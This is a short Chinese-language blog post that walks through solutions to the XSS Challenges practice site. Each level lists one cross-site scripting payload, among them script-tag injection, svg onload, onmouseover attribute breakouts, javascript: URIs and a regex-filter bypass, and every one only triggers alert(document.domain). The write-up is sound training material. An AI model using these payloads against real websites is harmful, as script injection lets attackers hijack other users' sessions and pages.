---
layout: post
author: "kele"
date: "2018-02-28 15:45:43"
title: "XSS Challenges solution"
tags: 
  - xss
---
# XSS Challenges solution   
题目地址:http://xss-quiz.int21h.jp   

## challenge 1 
输出在搜索结果里面，有引号包围，所以先闭合双引号，然后为所欲为就可以了     
payload: `"<svg onload=alert(document.domain)>`   

## challenge 2 
输出在搜索框里面，闭合tag和双引号  
payload: `"><script>alert(document.domain)</script>`

## challenge 3 
input 输入框被逃逸了，但是其实还有一个输入点是那个单选下拉菜单，使用开发者工具，修改一个国家的文本为 :    
payload: `</b><svg onload=alert(document.domain)>`   

## challenge 4 
使用开发者工具看到隐藏表单进行xss 
payload: `"><svg onload=alert(document.domain)>`  

## chanllenge 5 
输入框限制长度，直接用开发者工具把`max-length`设置成100  
payload: `" onmouseover=alert(document.domain) "`
前面双引号用来闭合value，后面双引号用来闭合多出来的一个双引号   

## challenge 6 
和上面的payload 一样  

## challenge 7 
和上面一样。。。。

## challenge 8 
javascript 协议 
payload: `javascript:alert(document.domain)` 

## <del>challenge 9  </del>
漏洞是ie7 的。。。。放弃了   
直接用开发者工具在源码加一个alert,跳过吧 pass 

## challenge 10 
使用正则替换掉了domain为空    
payload: `" onmouseover=alert(document.domadomainin) `   

## challenge 11 
利用正则替换了script on style  
所以可以用伪协议  
payload: `"><a href="javascript:alert(document.domain);">test</a>`

后面有许多ie特性，实在不想做了，干脆看看wp学一波。。。。